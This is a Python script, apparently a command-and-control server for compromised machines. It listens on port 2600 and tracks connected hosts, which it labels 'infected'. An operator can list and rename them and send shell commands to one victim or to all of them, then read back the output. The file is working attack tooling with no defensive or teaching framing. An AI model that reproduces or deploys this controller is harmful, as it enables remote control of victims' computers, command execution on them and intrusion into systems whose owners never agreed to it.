import socket
import select
import sys

def server():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(("0.0.0.0", 2600))
    soc.listen(1)
    server_list = [soc, sys.stdin]
    dict_ip = {}
    print("Server is ready and listening")
    print("waiting for connection")
    while True:
        r_sock, w_sock, x_sock = select.select(server_list, [], [])
        for elem in r_sock:
            if elem == soc:
                (clientsocket, addressguest) = soc.accept()
                print(f"Connection from {addressguest}")
                if not clientsocket in server_list:
                    server_list.append(clientsocket)
                if not addressguest in dict_ip:
                    dict_ip[addressguest[0]] = clientsocket
                    
                    
                    
                    
            elif elem == sys.stdin:
                command = sys.stdin.readline().strip()
                if not command:
                    continue #accidental Enter pressed

                parts = command.split(" ", 1)
                indication = parts[0]
                order = parts[1] if len(parts) > 1 else ""
                if indication == "mc":
                    match order.strip().split(" ")[0]:
                        case "rename":
                            old_name = order.strip().split(" ")[1]
                            new_name = order.strip().split(" ")[2]
                            try:
                                
                                dict_ip[new_name] = dict_ip[old_name]
                                del dict_ip[old_name]
                            except : print("error in your command")
                            
                        case "list":
                            for infected in dict_ip:
                                print(f"{infected}: {dict_ip[infected]}")
                    
                    
                    
                    
                    
                else:
                    send_message(command, dict_ip)
                
            else:
                nom_cible = "Inconnu"
                for name, sock in dict_ip.items():
                    if sock == elem:
                        nom_cible = name
                        break
                        
                new_data = elem.recv(4096).decode('cp850', errors='replace').strip()
                if new_data and not ">" in new_data:
                    
                    
                    print(f"\n[answer from {nom_cible}] :\n {new_data}")
                else:
                    print(f"connection lost with {nom_cible}")
                    server_list.remove(elem)
                    if nom_cible in dict_ip:
                        del dict_ip[nom_cible]
                    elem.close()
                

    soc.close()
    return



def send_message(message, infected_dict):
    parts = message.strip().split(" ", 1)
    
    
    if len(parts) < 2:
        print("[!] Format : <IP ou *> <commande>")
        return 0
        
    target = parts[0]
    final_mess = parts[1] + "\n"
    
    
    if target == "*":
        for name,socket_client in infected_dict.items():
            try:
                socket_client.send(final_mess.encode("utf-8"))
            except Exception:
                pass
    else:
        if target in infected_dict:
            try:
                infected_dict[target].send(final_mess.encode("utf-8"))
            except Exception as e:
                print(f"[!] Erreur d'envoi à {target}")
        else:
            print(f"[!] Cible '{target}' introuvable. Tapez 'mc list' pour voir les cibles.")
            
    return 1




















server()